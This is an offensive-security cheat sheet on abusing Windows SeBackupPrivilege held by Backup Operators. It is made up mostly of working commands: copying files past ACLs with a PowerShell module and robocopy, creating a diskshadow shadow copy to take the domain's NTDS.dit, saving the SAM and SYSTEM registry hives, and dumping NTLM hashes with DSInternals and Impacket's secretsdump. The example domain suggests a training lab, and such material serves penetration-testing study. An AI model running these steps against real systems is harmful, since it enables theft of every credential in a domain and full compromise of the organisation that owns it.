
# Leveraging Backup Privilege for Privilege Escalation
## Backup Operators
The members of the "Backup Operators" security group have SeBackupPrivilege & SeRestorePrivilege.
Abusing these privileges gives the ability to read / write everywhere on the filesystem, with no regard for ACLs.
We cannot just copy files we don't have access to, we need to set the flag FILE_FLAG_BACKUP_SEMANTICS in our calls to WinAPI.

### Using SeBackupPrivilegeUtils PowerShell Module
[This PowerShell module](https://github.com/giuliano108/SeBackupPrivilege) provides Cmdlets to copy a file using the backup flag. 
```ps
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Check if the privilege is enabled
Get-SeBackupPrivilege

# Enables SeBackupPrivilege
Set-SeBackupPrivilege

# Copies a file
Copy-FileSeBackupPrivilege \path\to\file \path\to\copy
```

### Using robocopy
[robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) is a built in executable allowing us to copy files in backup mode using the '/b' flag: 
```
robocopy /b \path\to\file \path\to\copy
```

### Copying NTDS.dit
NTDS.dit is a juicy target, as it contains the NTLM hashes for every object in the domain. However it is locked and we cannot access it normally. <br>
We need to create a Shadow copy of the C:\ volume using vssadmin or with [diskshadow.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) and map it as a new E:\ volume like this :
```ps1
PS C:\> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Then, simply copy the NTDS.dit file from the shadow copy :
```ps1
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\path\to\save
```

### SAM and SYSTEM Registry Hives
This privilege also allows us to backup the registry hives,
```bat
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Extract hashes from NTDS.dit
#### Using [DSInternals.ps1](https://github.com/MichaelGrafnetter/DSInternals/tree/master)

```ps1
Import-Module .\DSInternals.ps1
$key = Get-BootKey -SystemHivePath .\SYSTEM.SAV
# To dump all hashes (/!\ Very long output) : 
Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key

# To dump a specific domain account (here, Administrator@inlanefreight.local): 
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=user,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
#### Using Impacket's secrestdump.py
```ps1
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
